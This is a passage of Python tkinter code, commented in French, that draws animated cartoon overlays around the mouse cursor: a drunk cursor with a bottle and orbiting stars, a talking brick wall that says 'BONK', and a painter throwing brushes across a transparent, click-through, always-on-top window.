        # Nœud coulant cartoon / grappin enserrant la souris
        self.canvas.create_oval(mx - 15, my - 15, mx + 15, my + 15, outline="#b45309", width=3)
        self.canvas.create_line(mx - 18, my - 4, mx + 18, my - 4, fill="#78350f", width=4)
        self.canvas.create_line(mx - 18, my + 4, mx + 18, my + 4, fill="#78350f", width=4)
        self.canvas.create_text(mx, my - 20, text="🪢", font=("Segoe UI Emoji", 14))
        
        # Lignes de friction / dérapage sous le curseur traîné
        self.canvas.create_line(mx - facing*10, my + 22, mx - facing*30, my + 22, fill="#f59e0b", width=3, dash=(3, 3))
        self.canvas.create_line(mx - facing*10, my + 28, mx - facing*25, my + 28, fill="#f59e0b", width=2, dash=(3, 3))
        
        # 10. Bulle de dialogue comique
        self.speech_timer = (self.speech_timer + 1) % 45
        if self.speech_timer == 1:
            self.speech_text = random.choice([
                "AVANCE ! HO-ISSE ! 🏃‍♂️💨",
                "C'EST DU LOURD ! 💥",
                "TIIIIRE LA SOURIS ! 🐭",
                "PAR ICI LE CURSEUR ! ⚡",
                "HNNNGH ! ÇA VIENT ! 💪"
            ])
            
        bubble_x = cx + facing * 20
        bubble_y = cy - 65
        self.canvas.create_text(bubble_x, bubble_y, text=self.speech_text, font=("Impact", 13, "bold"), fill="#f97316")

class CartoonDrunkOverlay:
    """
    Souris ivre cartoon :
    1. Phase Boisson (~2s) : la souris boit dans une bouteille d'alcool réaliste.
    2. Phase Ivre : la souris arrête complètement de boire (zéro bouteille),
       sa tête tourne d'ivresse (yeux en spirales vectorielles animées, vacillement)
       avec des étoiles cartoon dorées qui orbitent en 3D autour de sa tête.
       (Aucun emoji, aucun texte, pur rendu vectoriel cartoon).
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 280, 240
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.last_wx = None
        self.last_wy = None
        self.phase = 0.0
        self.bubbles = []
        self.visible = False
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global drunk_state
            if drunk_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                mx = drunk_state.get("mx", 0)
                my = drunk_state.get("my", 0)
                is_drinking = drunk_state.get("drinking", False)
                
                self.phase += 0.22
                wx = int(mx - (self.w // 2))
                wy = int(my - 125)
                
                if (wx, wy) != (self.last_wx, self.last_wy):
                    self.last_wx = wx
                    self.last_wy = wy
                    if self.hwnd:
                        ctypes.windll.user32.SetWindowPos(
                            self.hwnd, 0, wx, wy, 0, 0,
                            0x0001 | 0x0004 | 0x0010
                        )
                    else:
                        self.win.geometry(f"{self.w}x{self.h}+{wx}+{wy}")
                        
                # Bulles d'alcool pétillantes (uniquement quand elle boit)
                if is_drinking and random.random() < 0.35:
                    self.bubbles.append({
                        "x": (self.w // 2) - 15 + random.uniform(-6, 6),
                        "y": 125 - 10 + random.uniform(-4, 4),
                        "vx": random.uniform(-1.5, 1.5),
                        "vy": random.uniform(-2.2, -0.6),
                        "r": random.uniform(2.5, 5.5),
                        "life": 1.0
                    })
                    
                self._draw(is_drinking)
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.bubbles.clear()
                    self.last_wx = None
                    self.last_wy = None
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)

    def _draw_star(self, cx, cy, radius, spin):
        """Dessine une véritable étoile cartoon 5 branches dorée sans aucun emoji."""
        pts = []
        r_in = radius * 0.42
        for i in range(10):
            r = radius if i % 2 == 0 else r_in
            ang = spin + i * (math.pi / 5.0) - (math.pi / 2.0)
            pts.append(cx + math.cos(ang) * r)
            pts.append(cy + math.sin(ang) * r)
        self.canvas.create_polygon(pts, fill="#fbbf24", outline="#b45309", width=1.5)
        # Éclat spéculaire blanc au centre
        cr = max(1.5, radius * 0.22)
        self.canvas.create_oval(cx - cr, cy - cr, cx + cr, cy + cr, fill="#ffffff", outline="")

    def _draw(self, is_drinking=False):
        self.canvas.delete("all")
        mx = self.w // 2
        my = 125
        
        # Angle d'inclinaison et vacillement comique
        if is_drinking:
            sway_angle = math.sin(self.phase * 2.5) * 8.0 - 10.0
        else:
            # Vacillement prononcé quand elle est ivre (sa tête qui tourne)
            sway_angle = math.sin(self.phase * 1.8) * 34.0 + math.cos(self.phase * 0.8) * 14.0
            
        sway_rad = math.radians(sway_angle)
        cos_r = math.cos(sway_rad)
        sin_r = math.sin(sway_rad)
        
        # Position de la "tête" du curseur
        head_x = mx + (6 * cos_r - 10 * sin_r)
        head_y = my + (6 * sin_r + 10 * cos_r)
        
        # =====================================================================
        # 1. ÉTOILES 3D QUI TOURNENT AUTOUR DE LA TÊTE (ARRIÈRE-PLAN)
        # =====================================================================
        star_count = 5
        orbit_rx = 38.0
        orbit_ry = 13.0
        
        if not is_drinking:
            for i in range(star_count):
                ang = self.phase * 1.6 + i * (2.0 * math.pi / star_count)
                sin_a = math.sin(ang)
                if sin_a < 0:
                    cos_a = math.cos(ang)
                    sx = head_x + cos_a * orbit_rx
                    sy = head_y + sin_a * orbit_ry - 12.0
                    scale = 0.70 + 0.30 * (sin_a + 1.0) / 2.0
                    spin = self.phase * 2.5 + i
                    self._draw_star(sx, sy, 8.0 * scale, spin)
                    
        # =====================================================================
        # 2. LA SOURIS (CURSEUR FLÈCHE) AVEC SA TÊTE QUI TOURNE
        # =====================================================================
        base_pts = [
            (0, 0),       # Pointe
            (0, 28),      # Bord gauche
            (7, 21),      # Coin intérieur gauche
            (14, 32),     # Patte extérieure
            (19, 30),     # Patte bas
            (12, 18),     # Coin intérieur droit
            (21, 18)      # Bord droit
        ]
        
        rot_pts = []
        for px, py in base_pts:
            rx = mx + (px * cos_r - py * sin_r)
            ry = my + (px * sin_r + py * cos_r)
            rot_pts.append((rx, ry))
            
        # Corps du curseur flèche blanc à contour noir net
        self.canvas.create_polygon(rot_pts, fill="#ffffff", outline="#000000", width=2.5)
        
        # Joues rouges d'ébriété
        cheek_x = mx + (6 * cos_r - 18 * sin_r)
        cheek_y = my + (6 * sin_r + 18 * cos_r)
        self.canvas.create_oval(cheek_x - 5, cheek_y - 4, cheek_x + 5, cheek_y + 4, fill="#fb7185", outline="")
        
        # Yeux de la souris
        if is_drinking:
            # Yeux fermés satisfaits en dégustant (arcs simples)
            for ox in [3, 9]:
                ex = mx + (ox * cos_r - 10 * sin_r)
                ey = my + (ox * sin_r + 10 * cos_r)
                self.canvas.create_arc(ex - 3, ey - 3, ex + 3, ey + 3, start=0, extent=180, style="arc", outline="#000000", width=2)
        else:
            # YEUX EN SPIRALE HYPNOTIQUE VECTORIELLE ANIMÉE (SA TÊTE QUI TOURNE !)
            for ox in [3, 9]:
                ex = mx + (ox * cos_r - 10 * sin_r)
                ey = my + (ox * sin_r + 10 * cos_r)
                pts_sp = []
                for deg in range(0, 480, 40):
                    rad = math.radians(deg + self.phase * 220)
                    r = 0.5 + (deg / 480.0) * 3.2
                    pts_sp.append((ex + math.cos(rad) * r, ey + math.sin(rad) * r))
                for idx in range(len(pts_sp) - 1):
                    self.canvas.create_line(pts_sp[idx][0], pts_sp[idx][1], pts_sp[idx+1][0], pts_sp[idx+1][1], fill="#0f172a", width=1.5)
                    
        # =====================================================================
        # 3. LA BOUTEILLE D'ALCOOL (UNIQUEMENT LORS DE LA PHASE BOISSON !)
        # Quand elle est ivre, la souris a arrêté de boire (zéro bouteille).
        # =====================================================================
        if is_drinking:
            gulp_bob = math.sin(self.phase * 5.0) * 3.0
            bottle_tip_x = mx - 2
            bottle_tip_y = my - 6 + gulp_bob
            
            b_ang = math.radians(-44.0 + math.sin(self.phase * 2.0) * 5.0)
            b_cos = math.cos(b_ang)
            b_sin = math.sin(b_ang)
            
            b_len = 82.0
            b_w = 26.0
            b_base_x = bottle_tip_x - b_cos * b_len
            b_base_y = bottle_tip_y - b_sin * b_len
            
            nx = -b_sin * (b_w / 2.0)
            ny = b_cos * (b_w / 2.0)
            
            neck_len = 28.0
            neck_w = 11.0
            nnx = -b_sin * (neck_w / 2.0)
            nny = b_cos * (neck_w / 2.0)
            
            neck_base_x = bottle_tip_x - b_cos * neck_len
            neck_base_y = bottle_tip_y - b_sin * neck_len
            
            # Corps en verre ambré
            body_pts = [
                (neck_base_x + nx, neck_base_y + ny),
                (b_base_x + nx, b_base_y + ny),
                (b_base_x - nx, b_base_y - ny),
                (neck_base_x - nx, neck_base_y - ny)
            ]
            self.canvas.create_polygon(body_pts, fill="#78350f", outline="#451a03", width=2.5)
            self.canvas.create_oval(b_base_x - 14, b_base_y - 14, b_base_x + 14, b_base_y + 14, fill="#451a03", outline="")
            
            # Liquide ambré doré
            liq_base_x = b_base_x + b_cos * 6
            liq_base_y = b_base_y + b_sin * 6
            liq_pts = [
                (neck_base_x + nx*0.75, neck_base_y + ny*0.75),
                (liq_base_x + nx*0.75, liq_base_y + ny*0.75),
                (liq_base_x - nx*0.75, liq_base_y - ny*0.75),
                (neck_base_x - nx*0.75, neck_base_y - ny*0.75)
            ]
            self.canvas.create_polygon(liq_pts, fill="#d97706", outline="")
            
            # Étiquette
            lbl_cx = (neck_base_x + b_base_x) / 2.0
            lbl_cy = (neck_base_y + b_base_y) / 2.0
            self.canvas.create_oval(lbl_cx - 15, lbl_cy - 12, lbl_cx + 15, lbl_cy + 12, fill="#fef3c7", outline="#92400e", width=1.5)
            
            # Goulot
            neck_pts = [
                (bottle_tip_x + nnx, bottle_tip_y + nny),
                (neck_base_x + nnx, neck_base_y + nny),
                (neck_base_x - nnx, neck_base_y - nny),
                (bottle_tip_x - nnx, bottle_tip_y - nny)
            ]
            self.canvas.create_polygon(neck_pts, fill="#92400e", outline="#451a03", width=2)
            
            collar_x = bottle_tip_x - b_cos * 10
            collar_y = bottle_tip_y - b_sin * 10
            self.canvas.create_line(collar_x + nnx*1.3, collar_y + nny*1.3, collar_x - nnx*1.3, collar_y - nny*1.3, fill="#f59e0b", width=3)
            
            # Reflets blancs lustrés
            self.canvas.create_line(neck_base_x + nx*0.85, neck_base_y + ny*0.85, b_base_x + nx*0.85, b_base_y + ny*0.85, fill="#ffffff", width=2.5, capstyle=tk.ROUND)
            self.canvas.create_line(bottle_tip_x + nnx*0.8, bottle_tip_y + nny*0.8, neck_base_x + nnx*0.8, neck_base_y + nny*0.8, fill="#ffffff", width=1.5, capstyle=tk.ROUND)
            
            # Jet d'alcool dans la pointe
            self.canvas.create_line(bottle_tip_x, bottle_tip_y, mx, my, fill="#f59e0b", width=4, capstyle=tk.ROUND)
            self.canvas.create_line(bottle_tip_x, bottle_tip_y, mx, my, fill="#fef08a", width=2, capstyle=tk.ROUND)
            
            # Gouttes d'éclaboussure
            for d in range(3):
                dx = mx + math.sin(self.phase * 5.0 + d) * 6.0
                dy = my + math.cos(self.phase * 5.0 + d) * 3.5
                self.canvas.create_oval(dx - 2, dy - 2, dx + 2, dy + 2, fill="#facc15", outline="#b45309", width=1)
                
            # Bulles
            new_b = []
            for b in self.bubbles:
                b["x"] += b["vx"]
                b["y"] += b["vy"]
                b["life"] -= 0.05
                if b["life"] > 0:
                    self.canvas.create_oval(b["x"] - b["r"], b["y"] - b["r"], b["x"] + b["r"], b["y"] + b["r"], fill="", outline="#fef08a", width=1.5)
                    new_b.append(b)
            self.bubbles = new_b
            
        # =====================================================================
        # 4. ÉTOILES 3D QUI TOURNENT AUTOUR DE LA TÊTE (PREMIER PLAN)
        # =====================================================================
        if not is_drinking:
            for i in range(star_count):
                ang = self.phase * 1.6 + i * (2.0 * math.pi / star_count)
                sin_a = math.sin(ang)
                if sin_a >= 0:
                    cos_a = math.cos(ang)
                    sx = head_x + cos_a * orbit_rx
                    sy = head_y + sin_a * orbit_ry - 12.0
                    scale = 0.70 + 0.30 * (sin_a + 1.0) / 2.0
                    spin = self.phase * 2.5 + i
                    self._draw_star(sx, sy, 8.0 * scale, spin)

class CartoonWallOverlay:
    """
    Mur invisible cartoon : mur de briques 3D vivant avec mortier, fissures,
    mousse végétale et un visage expressif doté d'yeux animés qui suivent la souris,
    accompagné d'un impact spectaculaire '💥 BONK ! 💥' avec débris et étincelles.
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 160, 320
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.last_wx = None
        self.last_wy = None
        self.phase = 0.0
        self.debris = []
        self.visible = False
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global wall_state
            if wall_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                mx = wall_state.get("mx", 0)
                my = wall_state.get("my", 0)
                is_bonking = wall_state.get("is_bonking", False)
                wall_x = wall_state.get("wall_x", mx)
                
                self.phase += 0.2
                wx = int(wall_x - (self.w // 2))
                wy = int(my - (self.h // 2))
                
                if (wx, wy) != (self.last_wx, self.last_wy):
                    self.last_wx = wx
                    self.last_wy = wy
                    if self.hwnd:
                        ctypes.windll.user32.SetWindowPos(
                            self.hwnd, 0, wx, wy, 0, 0,
                            0x0001 | 0x0004 | 0x0010
                        )
                    else:
                        self.win.geometry(f"{self.w}x{self.h}+{wx}+{wy}")
                        
                if is_bonking and len(self.debris) < 12:
                    for _ in range(3):
                        self.debris.append({
                            "x": (self.w // 2) + random.uniform(-10, 10),
                            "y": (self.h // 2) + random.uniform(-20, 20),
                            "vx": random.uniform(-5, 5),
                            "vy": random.uniform(-6, -2),
                            "r": random.uniform(3, 7),
                            "color": random.choice(["#b91c1c", "#d97706", "#94a3b8"]),
                            "life": 1.0
                        })
                        
                self._draw(mx, my, wx, wy, is_bonking)
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.debris.clear()
                    self.last_wx = None
                    self.last_wy = None
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)
            
    def _draw(self, mx, my, wx, wy, is_bonking):
        self.canvas.delete("all")
        cx = self.w // 2
        cy = self.h // 2
        
        # 1. Structure du mur de briques 3D
        brick_w = 42
        brick_h = 24
        start_y = 15
        row = 0
        while start_y < self.h - 15:
            offset_x = -15 if row % 2 == 0 else 0
            for bx in range(cx - 35 + offset_x, cx + 45, brick_w):
                # Brique rouge avec bord biseauté 3D
                self.canvas.create_rectangle(bx, start_y, bx + brick_w - 4, start_y + brick_h - 4, fill="#b91c1c", outline="#7f1d1d", width=2)
                self.canvas.create_line(bx + 2, start_y + 2, bx + brick_w - 6, start_y + 2, fill="#f87171", width=1) # reflet haut
            start_y += brick_h
            row += 1
            
        # Touches de mousse végétale cartoon
        self.canvas.create_oval(cx - 28, cy - 80, cx - 14, cy - 65, fill="#65a30d", outline="#3f6212", width=1)
        self.canvas.create_oval(cx + 12, cy + 70, cx + 28, cy + 85, fill="#65a30d", outline="#3f6212", width=1)
        
        # 2. Visage vivant cartoon au centre du mur
        face_y = cy - 10
        # Yeux globuleux suivant la souris
        eye_spacing = 18
        rel_mx = mx - (wx + cx)
        rel_my = my - (wy + face_y)
        pupil_dist = math.hypot(rel_mx, rel_my) or 1.0
        pupil_dx = (rel_mx / pupil_dist) * 4.5
        pupil_dy = (rel_my / pupil_dist) * 4.5
        
        for side in [-1, 1]:
            ex = cx + side * eye_spacing
            ey = face_y
            # Blanc de l'œil
            self.canvas.create_oval(ex - 12, ey - 14, ex + 12, ey + 14, fill="#ffffff", outline="#0f172a", width=3)
            # Pupille noire vivante
            self.canvas.create_oval(ex + pupil_dx - 5, ey + pupil_dy - 5, ex + pupil_dx + 5, ey + pupil_dy + 5, fill="#0f172a", outline="")
            # Reflet blanc dans la pupille
            self.canvas.create_oval(ex + pupil_dx - 3, ey + pupil_dy - 4, ex + pupil_dx, ey + pupil_dy - 1, fill="#ffffff", outline="")
            # Gros sourcil de brique
            brow_angle = -side * 15 if not is_bonking else side * 25
            self.canvas.create_line(ex - 14, ey - 16 - side * 2, ex + 14, ey - 16 + side * 2, fill="#450a0a", width=5)
            
        # Bouche de brique avec rictus narquois ou dents serrées
        if is_bonking:
            self.canvas.create_rectangle(cx - 16, face_y + 24, cx + 16, face_y + 36, fill="#ffffff", outline="#0f172a", width=2)
            self.canvas.create_line(cx - 6, face_y + 24, cx - 6, face_y + 36, fill="#0f172a", width=1)
            self.canvas.create_line(cx + 6, face_y + 24, cx + 6, face_y + 36, fill="#0f172a", width=1)
        else:
            self.canvas.create_arc(cx - 18, face_y + 15, cx + 18, face_y + 38, start=180, extent=180, fill="#450a0a", outline="#0f172a", width=2)
            
        # 3. Débris et poussière de choc
        new_debris = []
        for d in self.debris:
            self.canvas.create_oval(d["x"] - d["r"], d["y"] - d["r"], d["x"] + d["r"], d["y"] + d["r"], fill=d["color"], outline="#0f172a", width=1)
            d["x"] += d["vx"]
            d["y"] += d["vy"]
            d["vy"] += 0.5
            d["life"] -= 0.08
            if d["life"] > 0:
                new_debris.append(d)
        self.debris = new_debris
        
        # 4. Impact BONK spectaculaire avec étoile de bande-dessinée
        if is_bonking:
            # Étoile cartoon à 12 branches
            star_pts = []
            for sp in range(12):
                sa = sp * (math.pi / 6.0) + self.phase
                sr = 38 if sp % 2 == 0 else 18
                star_pts.append((cx + math.cos(sa) * sr, cy + math.sin(sa) * sr))
            self.canvas.create_polygon(star_pts, fill="#facc15", outline="#ea580c", width=3)
            self.canvas.create_text(cx, cy, text="💥 BONK ! 💥", font=("Impact", 13, "bold"), fill="#dc2626")

class CartoonPainterOverlay:
    """
    Peintre cartoon de dessin animé classique (style Looney Tunes / Tex Avery / Disney vintage) :
    - L'animation d'introduction complète (entrée théâtrale, cadrage d'artiste, illumination Eurêka 💡)
      est jouée UNE SEULE FOIS au début !
    - Ensuite, le peintre entre dans un état de transe artistique en salves continues :
      il enchaîne en boucle les lancers (trempage rapide dans la palette -> moulinet 360° -> balancer balistique -> impact et splat 3D)
      sans jamais recommencer l'intro depuis le début !
    - Vraie ombre cartoon portée au sol : pénombre douce et diffuse, ombre de projection du corps, de la tête et de la palette
      qui s'étire selon l'inclinaison (lean), cœur d'occlusion profond et ombres de contact direct sous les semelles des chaussures,
      qui reste ancrée au sol même lors des sauts.
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.sw = self.win.winfo_screenwidth()
        self.sh = self.win.winfo_screenheight()
        self.w, self.h = self.sw, self.sh
        self.win.geometry(f"{self.w}x{self.h}+0+0")
        
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.phase = 0.0
        self.visible = False
        self._loop_active = True
        
        # Position du peintre (en bas à droite de l'écran)
        self.base_px = float(self.sw - 190)
        self.base_py = float(self.sh - 145)
        self.px = self.base_px
        self.py = self.base_py
        self.floor_y = float(self.base_py + 44)
        
        # Palette de couleurs riches d'artiste peintre
        self.palette_colors = [
            "#dc2626", # Rouge Cadmium
            "#2563eb", # Bleu Outremer
            "#facc15", # Jaune Chrome
            "#059669", # Vert Émeraude
            "#9333ea", # Violet Impérial
            "#db2777", # Rose Magenta
            "#0891b2", # Cyan Azur
            "#ea580c", # Orange Brûlé
            "#e11d48", # Cramoisi
            "#0d9488"  # Turquoise
        ]
        self.color_index = 0
        self.current_color = self.palette_colors[0]
        
        # Gestion de l'intro unique et des salves continues
        self.intro_done = False
        self.anim_state = "ENTER"
        self.state_timer = 0
        self.windup_angle = 0.0
        self.windup_speed = 14.0
        self.speech_text = "Place au Maestro ! 🎨"
        self.speech_timer = 60
        self.target_x = self.sw // 2
        self.target_y = self.sh // 3
        self.throw_count = 0
        
        # Objets animés
        self.flying_brushes = []
        self.stuck_brushes = []
        self.palette_splashes = []
        self.flight_droplets = []
        self.shockwaves = []
        self.comic_texts = []
        self.dust_puffs = []
        self.music_notes = []
        self.sweat_drops = []
        self.lightbulb_rays = []
        
        self._tick()

    def _trigger_throw(self):
        """Déclenche le vol hyperbolique 3D d'un pinceau vers la vitre de l'écran."""
        tx = random.randint(140, self.sw - 260)
        ty = random.randint(100, self.sh - 220)
        self.target_x = tx
        self.target_y = ty
        self.throw_count += 1
        
        self.flying_brushes.append({
            "sx": self.px - 40,
            "sy": self.py - 60,
            "tx": tx,
            "ty": ty,
            "color": self.current_color,
            "t": 0.0,
            "speed": random.uniform(0.045, 0.065),
            "rot": random.uniform(0, 360),
            "spin": random.choice([-24.0, 24.0, -32.0, 32.0]),
            "arc": random.uniform(-180, -110)
        })

    def _tick(self):
        if not self._loop_active:
            return
        try:
            global painter_state
            if painter_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                self.phase += 0.12
                self.state_timer += 1
                
                # Respiration organique subtile
                self.px = self.base_px + math.sin(self.phase * 0.5) * 5
                self.py = self.base_py + math.cos(self.phase * 0.8) * 3
                
                # =========================================================================
                # 1. PHASE D'INTRO (EXÉCUTÉE UNE SEULE FOIS AU TOUT DÉBUT)
                # =========================================================================
                if not self.intro_done:
                    if self.anim_state == "ENTER":
                        if self.state_timer == 1:
                            self.speech_text = "Silence dans l'atelier ! Le Maître arrive... 🎨"
                            self.speech_timer = 50
                            self.current_color = self.palette_colors[self.color_index % len(self.palette_colors)]
                        step_offset = max(0, 40 - self.state_timer) * 3.5
                        self.px += step_offset
                        if self.state_timer > 45:
                            self.anim_state = "MEASURE"
                            self.state_timer = 0
                            
                    elif self.anim_state == "MEASURE":
                        if self.state_timer == 1:
                            self.speech_text = "Mmh... quelle horreur spatiale ! Jaugeons la composition... 📐"
                            self.speech_timer = 55
                        tilt = math.sin(self.state_timer * 0.1) * 7
                        self.px += tilt
                        if self.state_timer > 60:
                            self.anim_state = "EUREKA"
                            self.state_timer = 0
                            
                    elif self.anim_state == "EUREKA":
                        if self.state_timer == 1:
                            self.speech_text = "💡 EURÊKA ! L'ILLUMINATION DIVINE ! ATTENTION LES YEUX !"
                            self.speech_timer = 45
                            for _ in range(6):
                                self.lightbulb_rays.append({
                                    "x": self.px - 6,
                                    "y": self.py - 90,
                                    "ang": random.uniform(0, 2 * math.pi),
                                    "len": random.uniform(18, 35),
                                    "life": 1.0
                                })
                        self.py -= abs(math.sin(self.state_timer * 0.3)) * 8
                        if self.state_timer > 40:
                            self.anim_state = "MIX"
                            self.state_timer = 0
                            
                    elif self.anim_state == "MIX":
                        if self.state_timer == 1:
                            self.speech_text = "Préparons la première touche de génie... 🧪"
                            self.speech_timer = 45
                        if self.state_timer % 3 == 0:
                            pal_x = self.px - 48
                            pal_y = self.py + 4
                            self.palette_splashes.append({
                                "x": pal_x + random.uniform(-12, 12),
                                "y": pal_y + random.uniform(-10, 10),
                                "vx": random.uniform(-4, 3),
                                "vy": random.uniform(-6, -2),
                                "color": self.current_color,
                                "r": random.uniform(3.0, 5.5),
                                "life": 1.0
                            })
                        if self.state_timer > 50:
                            self.anim_state = "WINDUP"
                            self.state_timer = 0
                            self.windup_angle = 0.0
                            self.windup_speed = 14.0
                            
                    elif self.anim_state == "WINDUP":
                        self.windup_speed = min(50.0, self.windup_speed + 1.2)
                        self.windup_angle += self.windup_speed
                        if self.state_timer == 1:
                            self.speech_text = "PREMIÈRE SALVE ! HOOO-ISSE ! 🚀"
                            self.speech_timer = 50
                        if self.state_timer % 4 == 0:
                            self.dust_puffs.append({
                                "x": self.px + random.uniform(-25, 25),
                                "y": self.floor_y - 2,
                                "r": random.uniform(8, 16),
                                "life": 1.0
                            })
                        if self.state_timer > 45:
                            self.anim_state = "THROW"
                            self.state_timer = 0
                            self._trigger_throw()
                            
                    elif self.anim_state == "THROW":
                        if self.state_timer > 14:
                            # L'intro est finie ! On enclenche les salves continues !
                            self.intro_done = True
                            self.anim_state = "RELOAD"
                            self.state_timer = 0

                # =========================================================================
                # 2. SALVES CONTINUES (LANCE PINCER APRÈS PINCEAU EN RAFALE SANS RECOMMENCER L'INTRO !)
                # =========================================================================
                else:
                    if self.anim_state == "RELOAD":
                        if self.state_timer == 1:
                            self.color_index += 1
                            self.current_color = self.palette_colors[self.color_index % len(self.palette_colors)]
                            self.speech_text = random.choice([
                                "ET UN AUTRE ! 🎨",
                                "PEINTURE ILLIMITÉE ! 🔥",
                                "PRENDS ÇA ! 💥",
                                "DE LA COULEUR PARTOUT ! 🌈",
                                "DANS LE MILLE ! 🎯",
                                "CHEF-D'ŒUVRE SUIVANT ! ✨",
                                "C'EST L'APOCALYPSE DE L'ART ! ⚡",
                                "JUSQU'À COUVRIR TOUT L'ÉCRAN ! 🖌️"
                            ])
                            self.speech_timer = 28
                            
                        # Émulsion de peinture rapide sur la palette
                        if self.state_timer % 3 == 0:
                            pal_x = self.px - 48
                            pal_y = self.py + 4
                            self.palette_splashes.append({
                                "x": pal_x + random.uniform(-10, 10),
                                "y": pal_y + random.uniform(-8, 8),
                                "vx": random.uniform(-3, 3),
                                "vy": random.uniform(-5, -2),
                                "color": self.current_color,
                                "r": random.uniform(2.5, 5.0),
                                "life": 1.0
                            })
                            
                        # Trempage éclair rapide
                        reload_max = 14 if self.throw_count > 6 else 18
                        if self.state_timer > reload_max:
                            self.anim_state = "WINDUP"
                            self.state_timer = 0
                            self.windup_angle = 0.0
                            self.windup_speed = 18.0
                            
                    elif self.anim_state == "WINDUP":
                        self.windup_speed = min(54.0, self.windup_speed + 1.4)
                        self.windup_angle += self.windup_speed
                        
                        if self.state_timer % 3 == 0:
                            self.dust_puffs.append({
                                "x": self.px + random.uniform(-25, 25),
                                "y": self.floor_y - 2,
                                "r": random.uniform(8, 16),
                                "life": 1.0
                            })
                            self.sweat_drops.append({
                                "x": self.px + random.uniform(-14, 14),
                                "y": self.py - 55,
                                "vx": random.uniform(-3, -1),
                                "vy": random.uniform(-4, -1),
                                "life": 1.0
                            })
                            
                        # Moulinet énergique
                        windup_max = 24 if self.throw_count > 6 else 32
                        if self.state_timer > windup_max:
                            self.anim_state = "THROW"
                            self.state_timer = 0
                            self._trigger_throw()
                            
                    elif self.anim_state == "THROW":
                        if self.state_timer > 12:  # Détente rapide (~0.24s)
                            self.anim_state = "RELOAD"
                            self.state_timer = 0

                # GESTION DES PINCEAUX EN VOL
                new_flying = []
                for b in self.flying_brushes:
                    b["t"] += b["speed"]
                    b["rot"] += b["spin"]
                    t = b["t"]
                    
                    cur_x = b["sx"] + (b["tx"] - b["sx"]) * t
                    cur_y = b["sy"] + (b["ty"] - b["sy"]) * t + (4 * b["arc"] * t * (1 - t))
                    
                    if random.random() < 0.85:
                        self.flight_droplets.append({
                            "x": cur_x + random.uniform(-9, 9),
                            "y": cur_y + random.uniform(-9, 9),
                            "color": b["color"],
                            "r": random.uniform(3.2, 6.0),
                            "vy": random.uniform(0.6, 2.8),
                            "life": 1.0
                        })
                        
                    if t >= 1.0:
                        tx = b["tx"]
                        ty = b["ty"]
                        col = b["color"]
                        
                        self.stuck_brushes.append({
                            "x": tx,
                            "y": ty,
                            "color": col,
                            "base_angle": random.uniform(-42, 42),
                            "vib_t": 0.0,
                            "vib_amp": random.uniform(32.0, 48.0),
                            "life": random.uniform(35.0, 60.0),
                            "splat_r": random.uniform(38, 62),
                            "drips": [
                                {
                                    "ox": random.uniform(-18, 18),
                                    "oy": random.uniform(14, 30),
                                    "len": 0.0,
                                    "max_len": random.uniform(90, 320),
                                    "speed": random.uniform(1.2, 3.8),
                                    "width": random.uniform(4.5, 8.5)
                                } for _ in range(random.randint(2, 5))
                            ]
                        })
                        
                        self.shockwaves.append({"x": tx, "y": ty, "r": 12, "max_r": 95, "alpha": 1.0})
                        self.shockwaves.append({"x": tx, "y": ty, "r": 5, "max_r": 65, "alpha": 1.0})
                        
                        self.comic_texts.append({
                            "x": tx,
                            "y": ty - 38,
                            "text": random.choice(["💥 TCHAAK !", "🎨 SPLAAT !", "✨ SPLOOSH !", "🖌️ BIM DANS LE MILLE !"]),
                            "color": col,
                            "life": 1.0
                        })
                        
                        # Peinture illimitée pour le peintre fou : aucune limite de pinceaux sur l'écran !
